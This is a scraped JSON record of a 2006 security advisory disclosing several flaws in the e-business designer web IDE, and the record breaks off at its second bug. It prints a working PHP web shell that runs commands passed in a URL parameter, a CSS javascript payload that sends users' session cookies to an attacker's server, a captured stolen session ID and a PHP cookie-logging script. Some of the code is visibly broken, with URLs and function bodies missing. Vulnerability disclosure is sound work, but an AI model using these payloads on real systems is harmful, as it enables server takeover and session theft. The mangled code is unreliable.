{
    "text": "vul_name : Several flaws in e-business designer ( eBD )  ， vul_cve : CVE-2006-2349 , CVE-2006-2348 , CVE-2006-2347 ， vul_poc : Regards ， - next part - ， -BEGIN PGP SIGNED MESSAGE- ， Hash : SHA1 ， - Advisory - ， Tittle : Several flaws in e-business designer ， Risk : Critical ， Date : 03.May.2006 ， Author : Pedro Andjar <pandujar *  @  * selfdefense.es> ， URL :  ， . :  [ INTRO ]  : . ， eBD is an Integrated Development Environment for the development and publication of web sites ,  ， web applications and web services ( Applications ) . In about 60% of the time typically required ,  ， Designer expedites the creation of Applications based on an open architecture , accepted web ， standards and without the need for in-depth knowledge about web technology. ， With eBD , you can develop any type of web application , web site or web service - intranet ,  ， extranet , eCommerce , eLearning portals , etc. You can deploy legacy applications on the web ， without re-coding the original application. ， eBusiness Designer has three distinct functional layers - Presentation , Data and Back Office. ， This structure permits a non-technical staff member to update any Application in real time ,  ， preview and publish it. ， . :  [ TECHNICAL DESCRIPTION ]  : . ， During the development of some evaluation tasks against applications managed by the e-businness ， designer software , several bugs were discovered :  ， . :  [ BUG # 1 ]  ， Risk : High ， Description : Ability to upload files to the system without authentication ， Affected versions : <= v3.1.4 ， Access to a web edition tool without authentication , allow remote users to upload files without ， restriction. This vulnerability can be achieved accessing the following URL :  ， The file can be placed in different folders of the application , usually it can be easily found ， exploring the web source code and searching the images folder. Another useful tool to ， find the file is :  ， Additionally we have the html edition tool , whose parameters are :  ， { ， var argumentos = \"form_name=\" + form_name + \"&name=\" + name + \"&source=\" + source + ， \"&ebd_links=\" + links ;  ， argumentos += \"&usar_vista=\" + idvista ;  ， argumentos += \"&usar_atributo=\" + atributo ;  ， var href = \"/common/html_editor/html_editor.html?\" ， The result of this vulnerability consists in the ability of upload and/or modify files in ， the system , giving the possiblity of attack both the server and web users. ， These kind of attacks were succeded against a server running 2.3.3 version of eBD :  ， Server side exploiting :  ， + Code execution in the system using php/asp.shells : If the system has php installed ,  ， command execution is possible through a web browser , uploading a file with the following content :  ， -dsr.php- ， <? ，  $ out = shell_exec (  $ _GET [ \"cmd\" ] .\" 2>&1\" )  ;  ， echo \"<pre> $ out</pre>\" ;  ， ?> ， -dsr.php- ， Then , queries like \" -a ; id\" can be executed. ， Client side exploiting :  ， + Cross Site Scripting ( XSS )  , in applications with authentication methods : Uploaded files with ， \"image_browser.upload.html\" can overwrite application files , so it will be possible to include a ， javascript code in a cascade style sheet ( .css )  , which will send us the cookie of users who have ， logged , through a get request to our server :  ， background : url ( 'javascript : document.images [ 1 ] .src=\" repeat-x bottom ;  ， We can place a script in our server to log cookies we receive , even this job is already ， done by the access_log. ， XX.XX.XX.XX - - [ 25/Apr/2006 : 11 : 04 : 22 +0200 ] \"GET /514.php?SESSION_ID=133844640fde6ef7bd6a7a9e1c5c4651 ， HTTP/1.1\" 200 316 \" \"Mozilla/4.0 ，  ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 ; .NET CLR 1.1.4322 ) \" ， Possible script :  ， -514.php- ， <? ，  $ log = \"/var/tmp/debug.log\" ;  ，  $ img_type = \"png\" ;  ，  $ img = imagecreatefrompng (  $ img_path )  ;  ， } ， } ，  $ img = imagecreatefromgif (  $ img_path )  ;  ， } ， } ，  $ img = imagecreatefromjpeg (  $ img_path )  ;  ， } ， } ，  $ init = \"Connection from \". $ _SERVER [ 'REMOTE_ADDR' ]  ;  ， file_put_contents (  $ log , \" $ initn\" , FILE_APPEND )  ;  ， foreach (  $ _SERVER as $ key => $ srv ) { ， file_put_contents (  $ log , \" $ key= $ srvn\" , FILE_APPEND )  ;  ， } ， file_put_contents (  $ log , \"GET paramsn\" , FILE_APPEND )  ;  ， foreach (  $ _GET as $ key => $ srv ) { ， file_put_contents (  $ log , \" $ key= $ srvn\" , FILE_APPEND )  ;  ， } ， } ， file_put_contents (  $ log , \"POST paramsn\" , FILE_APPEND )  ;  ， foreach (  $ _POST as $ key => $ srv ) { ， file_put_contents (  $ log , \" $ key= $ srvn\" , FILE_APPEND )  ;  ， } ， } ， file_put_contents (  $ log , \"n\" , FILE_APPEND )  ;  ， Header ( \"Content-type : image/png\" )  ;  ， ImagePNG ( load_png ( \"imgs/514.png\" )  ;  ， } ， Header ( \"Content-type : image/jpeg\" )  ;  ， ImageJPEG ( load_jpg ( \"imgs/514.jpg\" )  ;  ， } ， Header ( \"Content-type : image/gif\" )  ;  ， ImageGIF ( load_gif ( \"imgs/514.gif\" )  ;  ， } ， ?> ， -514.php- ， Adicionally was checked that there is no max concurrent sessions number for each user. ， This make easier this kind of attacks , because the cookies obtained by this way can be used ， as the same time that the legitimate user. ， . :  [ BUG # 2 ]  ， Risk : High ， Description : Imput validation error ， Affected Versions : v2.3.3 without auth",
    "time": "2006.05.16"
}